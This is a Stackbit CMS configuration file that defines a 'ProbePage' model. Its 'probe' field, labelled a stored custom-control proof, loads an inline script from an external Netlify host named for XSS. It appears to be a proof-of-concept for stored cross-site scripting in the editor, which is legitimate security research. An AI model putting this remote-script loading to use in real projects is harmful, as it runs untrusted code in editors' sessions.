import { GitContentSource } from '@stackbit/cms-git';
import { defineStackbitConfig } from '@stackbit/types';

export default defineStackbitConfig({
  stackbitVersion: '~0.6.0',
  nodeVersion: '18',
  ssgName: 'nextjs',
  contentSources: [
    new GitContentSource({
      rootPath: __dirname,
      contentDirs: ['content'],
      models: [
        {
          name: 'ProbePage',
          type: 'page',
          urlPath: '/{slug}',
          filePath: 'content/pages/{slug}.md',
          fields: [
            {
              name: 'title',
              type: 'string',
              required: true
            },
            {
              name: 'probe',
              type: 'string',
              label: 'Stored custom-control proof',
              controlType: 'custom-inline-script',
              controlUrl:
                'https://netlify-integration-workflow-fresh-xss-20261011-903.netlify.app/probe.js'
            }
          ]
        }
      ]
    })
  ]
});
